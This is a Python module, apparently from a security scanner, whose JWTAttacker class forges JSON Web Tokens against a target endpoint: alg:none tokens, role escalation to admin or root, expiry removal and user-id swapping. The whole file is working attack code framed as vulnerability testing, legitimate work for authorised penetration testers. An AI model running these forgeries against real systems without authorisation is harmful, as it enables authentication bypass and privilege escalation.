"""JWT Attacker — tests JWT tokens for weaknesses."""

from __future__ import annotations

import base64
import json
from typing import Any


class JWTAttacker:
    """Tests JWT tokens for alg:none, role manipulation, exp bypass, etc."""

    def __init__(self, http_client: Any):
        self.http = http_client

    async def test(self, token: str, endpoint: str, method: str = "GET") -> dict[str, Any]:
        findings = []
        evidence = []

        parts = token.split(".")
        if len(parts) != 3:
            return {"findings": [], "evidence": [], "error": "Invalid JWT format"}

        try:
            header = json.loads(base64.urlsafe_b64decode(parts[0] + "=="))
            payload = json.loads(base64.urlsafe_b64decode(parts[1] + "=="))
        except Exception as e:
            return {"findings": [], "evidence": [], "error": f"Cannot decode JWT: {e}"}

        evidence.append({"header": header, "payload": payload})

        alg = header.get("alg", "")

        if alg.lower() != "none":
            none_header = base64.urlsafe_b64encode(
                json.dumps({"alg": "none", "typ": header.get("typ", "JWT")}).encode()
            ).rstrip(b"=").decode()
            none_payload = base64.urlsafe_b64encode(
                json.dumps(payload).encode()
            ).rstrip(b"=").decode()
            forged = f"{none_header}.{none_payload}."

            result = await self.http.request(
                method=method,
                url=endpoint,
                headers={"Authorization": f"Bearer {forged}"},
            )
            evidence.append({"attack": "alg:none", "status": result["status_code"]})

            if 200 <= result["status_code"] < 400:
                findings.append({
                    "title": "JWT alg:none attack successful",
                    "severity": "critical",
                    "vuln_class": "jwt",
                    "endpoint": endpoint,
                    "evidence": f"Forged JWT with alg:none returned {result['status_code']}",
                })

        if "role" in payload:
            for new_role in ["superadmin", "admin", "hr_admin", "root"]:
                if payload["role"] != new_role:
                    modified = dict(payload)
                    modified["role"] = new_role
                    mod_b64 = base64.urlsafe_b64encode(
                        json.dumps(modified).encode()
                    ).rstrip(b"=").decode()
                    mod_token = f"{parts[0]}.{mod_b64}.{parts[2]}"

                    result = await self.http.request(
                        method=method,
                        url=endpoint,
                        headers={"Authorization": f"Bearer {mod_token}"},
                    )
                    evidence.append({
                        "attack": f"role_change_{new_role}",
                        "status": result["status_code"],
                    })

                    if 200 <= result["status_code"] < 400:
                        findings.append({
                            "title": f"JWT role manipulation to {new_role}",
                            "severity": "critical",
                            "vuln_class": "jwt",
                            "endpoint": endpoint,
                            "evidence": f"Changed role to {new_role}, got {result['status_code']}",
                        })

        if "exp" in payload:
            no_exp = {k: v for k, v in payload.items() if k != "exp"}
            no_exp_b64 = base64.urlsafe_b64encode(
                json.dumps(no_exp).encode()
            ).rstrip(b"=").decode()
            no_exp_token = f"{parts[0]}.{no_exp_b64}.{parts[2]}"

            result = await self.http.request(
                method=method,
                url=endpoint,
                headers={"Authorization": f"Bearer {no_exp_token}"},
            )
            evidence.append({"attack": "remove_exp", "status": result["status_code"]})

            if 200 <= result["status_code"] < 400:
                findings.append({
                    "title": "JWT expiration bypass — exp claim removed",
                    "severity": "high",
                    "vuln_class": "jwt",
                    "endpoint": endpoint,
                    "evidence": f"Removed exp claim, got {result['status_code']}",
                })

        id_keys = ["userId", "user_id", "sub", "id"]
        for key in id_keys:
            if key in payload:
                for fake_id in ["1", "0", "admin"]:
                    if str(payload.get(key)) != fake_id:
                        modified = dict(payload)
                        modified[key] = fake_id
                        mod_b64 = base64.urlsafe_b64encode(
                            json.dumps(modified).encode()
                        ).rstrip(b"=").decode()
                        mod_token = f"{parts[0]}.{mod_b64}.{parts[2]}"

                        result = await self.http.request(
                            method=method,
                            url=endpoint,
                            headers={"Authorization": f"Bearer {mod_token}"},
                        )
                        evidence.append({
                            "attack": f"change_{key}_to_{fake_id}",
                            "status": result["status_code"],
                        })

                        if 200 <= result["status_code"] < 400:
                            findings.append({
                                "title": f"JWT {key} manipulation to {fake_id}",
                                "severity": "high",
                                "vuln_class": "jwt",
                                "endpoint": endpoint,
                                "evidence": f"Changed {key} to {fake_id}, got {result['status_code']}",
                            })
                break

        result = await self.http.request(
            method=method,
            url=endpoint,
            headers={"Authorization": token},
        )
        evidence.append({"attack": "no_bearer_prefix", "status": result["status_code"]})
        if 200 <= result["status_code"] < 400:
            findings.append({
                "title": "JWT accepted without Bearer prefix",
                "severity": "medium",
                "vuln_class": "jwt",
                "endpoint": endpoint,
                "evidence": f"Token without Bearer prefix returned {result['status_code']}",
            })

        return {
            "findings": findings,
            "evidence": evidence,
            "attacks_performed": len(evidence) - 1,
            "vulnerable": len(findings) > 0,
        }
